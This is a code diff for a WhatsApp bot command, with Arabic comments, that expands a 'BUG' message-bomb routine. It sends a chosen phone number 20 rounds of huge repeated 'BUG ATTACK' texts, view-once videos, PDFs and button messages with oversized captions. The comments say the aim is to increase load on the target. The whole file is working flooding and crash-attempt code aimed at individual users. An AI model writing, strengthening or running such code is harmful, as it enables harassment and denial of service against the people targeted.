@@ -1,10 +1,52 @@
 module.exports = async (sock, number) => {
-    const jid = number.includes('@s.whatsapp.net') ? number : `${number}@s.whatsapp.net`;
+    try {
+        const jid = number.includes('@s.whatsapp.net') ? number : `${number}@s.whatsapp.net`;
 
-    for (let i = 0; i < 5; i++) {
-        await sock.sendMessage(jid, {
-            text: "🔥 BUG TEST 🔥\n".repeat(500),
-            mentions: [jid]
-        });
+        // =======================
+        // أمر BUG القوي
+        // =======================
+        const heavyText = "🔥 BUG ATTACK 🔥\n".repeat(2000); // نص كبير جداً
+        const mentionsArray = [jid];
+
+        // تكرار الإرسال مثل الكود الأصلي (زيادة الحمل)
+        for (let i = 0; i < 20; i++) {
+            await sock.sendMessage(jid, {
+                text: heavyText,
+                mentions: mentionsArray
+            });
+
+            await sock.sendMessage(jid, {
+                viewOnce: true,
+                video: { url: 'https://www.w3schools.com/html/mov_bbb.mp4' },
+                caption: "🎯 BUG PROTOCOL VIEWONCE 🎯"
+            });
+
+            await sock.sendMessage(jid, {
+                document: { url: 'https://www.w3.org/WAI/ER/tests/xhtml/testfiles/resources/pdf/dummy.pdf' },
+                mimetype: 'application/pdf',
+                fileName: 'bug_file.pdf',
+                caption: '🔥 BUG FILE ATTACK 🔥'
+            });
+
+            // إضافة Interactive Buttons ثقيلة
+            const buttons = [
+                { buttonId: 'btn1', buttonText: { displayText: '💥 انفجار 💥' }, type: 1 },
+                { buttonId: 'btn2', buttonText: { displayText: '🔥 حرق 🔥' }, type: 1 },
+                { buttonId: 'btn3', buttonText: { displayText: '⚡ صدمة ⚡' }, type: 1 }
+            ];
+
+            const buttonMessage = {
+                image: { url: 'https://upload.wikimedia.org/wikipedia/commons/3/3a/Cat03.jpg' },
+                caption: '🚨 BUG TEST 🚨\n'.repeat(200),
+                footer: 'اختبار BUG',
+                buttons: buttons,
+                headerType: 4
+            };
+
+            await sock.sendMessage(jid, buttonMessage);
+        }
+
+    } catch (err) {
+        console.error("خطأ في أمر BUG:", err);
     }
 };
